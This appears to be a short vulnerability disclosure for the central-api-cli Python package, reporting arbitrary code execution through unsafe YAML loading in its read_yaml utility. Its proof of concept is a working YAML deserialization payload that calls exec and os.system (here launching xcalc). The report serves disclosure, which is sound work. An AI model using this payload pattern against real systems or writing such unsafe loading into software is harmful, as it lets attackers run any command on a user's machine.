# :book: Description

`central-api-cli` A WIP CLI app to interact with Aruba Central API, this package is vulnerable for `arbitaryCodeexecution`

https://github.com/Pack3tL0ss/central-api-cli

# :recycle:  Steps To Reproduce-:  
  0) `git clone https://github.com/Pack3tL0ss/central-api-cli`
  1) run as in poc.png
```
from centralcli.utils import *


payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""


open('config.yaml','w+').write(payload)

Utils.read_yaml('config.yaml')
```
# :telescope: POC


## 💥 Impact
Arbitary code execution
